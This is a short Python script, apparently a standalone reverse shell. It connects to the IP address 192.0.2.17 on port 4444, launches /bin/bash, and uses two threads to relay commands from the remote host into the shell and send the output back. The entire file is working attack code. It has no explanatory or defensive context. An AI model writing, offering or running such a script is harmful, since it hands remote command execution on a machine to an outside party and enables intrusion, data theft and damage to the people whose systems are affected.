import socket
import subprocess
import threading
peer = socket.socket()
endpoint = ('192.0.2.17', 4444)
peer.connect(endpoint)
child = subprocess.Popen(['/bin/bash'], stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                         text=True)
def inbound():
    while True:
        data = peer.recv(8192)
        child.stdin.write(data.decode())
        child.stdin.flush()
def outbound():
    while True:
        line = child.stdout.readline()
        peer.sendall(line.encode())
threading.Thread(target=inbound).start()
threading.Thread(target=outbound).start()
